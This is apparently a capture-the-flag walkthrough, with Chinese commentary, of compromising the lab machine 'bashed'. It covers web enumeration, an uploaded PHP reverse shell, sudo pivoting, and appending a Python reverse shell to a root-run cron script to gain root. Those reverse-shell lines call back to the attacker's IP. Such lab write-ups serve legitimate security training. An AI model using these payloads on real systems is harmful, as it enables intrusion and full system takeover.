kali 10.10.16.3

靶机  **10.10.10.68**



```bash
└─# nmap -A -sV -sC -O  $IP -oA nmap.txt -p `nmap -sS -sU -PN -p- $IP --min-rate=8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.12 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 4.4 (95%), Linux 4.9 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```



```bash
└─# gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak  

/index.html           (Status: 200) [Size: 7743]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/contact.html         (Status: 200) [Size: 7805]
/about.html           (Status: 200) [Size: 8193]
/config.php
```



```
cewl http://10.10.10.68/single.html -w webcontent
```



```bash
└─# gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php 
===============================================================

/.php                 (Status: 403) [Size: 290]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
/config.php           (Status: 200) [Size: 0]
```

<img src=".\图片\Snipaste_2023-09-02_10-28-18.png" alt="Snipaste_2023-09-02_10-28-18" style="zoom:80%;" />



```bash
www-data@bashed:/var/www/html/uploads# wget http://10.10.16.3:1234/shell.php
```



shell.php 反弹 shell

```
python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.16.3%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27
```





```
python -c 'import pty; pty.spawn("/bin/bash")'
```



```bash
└─# nc -lvnp 443                                                                                                                                              1 ⨯
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.68] 34980
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ export XTRE^H^H
export XTRE^H^H
sh: 2: export: XT: bad variable name
$ export TERM=xterm
export TERM=xterm
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/var/www/html/uploads$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```



```bash
www-data@bashed:/home/scriptmanager$ ls -alh /etc/*cron*
ls -alh /etc/*cron*
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 20K
drwxr-xr-x  2 root root 4.0K Jun  2  2022 .
drwxr-xr-x 89 root root 4.0K Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--  1 root root  670 Mar  1  2016 php
-rw-r--r--  1 root root  191 Dec  4  2017 popularity-contest

/etc/cron.daily:
total 48K
drwxr-xr-x  2 root root 4.0K Jun  2  2022 .
drwxr-xr-x 89 root root 4.0K Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root  539 Apr  5  2016 apache2
-rwxr-xr-x  1 root root 1.5K Jan 17  2017 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1.6K Nov 26  2015 dpkg
-rwxr-xr-x  1 root root  372 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1.3K Nov  6  2015 man-db
-rwxr-xr-x  1 root root  435 Nov 17  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x  1 root root 3.4K Feb 26  2016 popularity-contest

/etc/cron.hourly:
total 12K
drwxr-xr-x  2 root root 4.0K Jun  2  2022 .
drwxr-xr-x 89 root root 4.0K Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12K
drwxr-xr-x  2 root root 4.0K Jun  2  2022 .
drwxr-xr-x 89 root root 4.0K Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 20K
drwxr-xr-x  2 root root 4.0K Jun  2  2022 .
drwxr-xr-x 89 root root 4.0K Jun  2  2022 ..
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
```



```
sudo -u scriptmanager /bin/bash
```



```bash
scriptmanager@bashed:/$ cd /scripts
cd /scripts
scriptmanager@bashed:/scripts$ ls -al
ls -al
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Sep  1 21:02 test.txt
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
testing 123!scriptmanager@bashed:/scripts$ 
```

我们可以看出文件之间的关系，sm这个用户拥有test.py这个文件，test.py会以root权限执行

那么我们的思路就变成了，如何让txt文件转发出有root权限的shell，那么就是项py文件中写入语句，注入到txt文件中去

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.settimeout(10);s.connect(("10.10.16.3",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> /scripts/test.py
```



```bash
scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.settimeout(10);s.connect(("10.10.16.3",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```



```bash
┌──(root💀kali)-[~/Desktop]
└─# nc -lvvp 5555            
listening on [any] 5555 ...
connect to [10.10.16.3] from 10.10.10.68 [10.10.10.68] 51530
root@bashed:/scripts# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bashed:/scripts# cd
cd
root@bashed:~# cat root.txt
cat root.txt
2a858adc6b0685bdac7396c26eb2c22c
root@bashed:~#
```




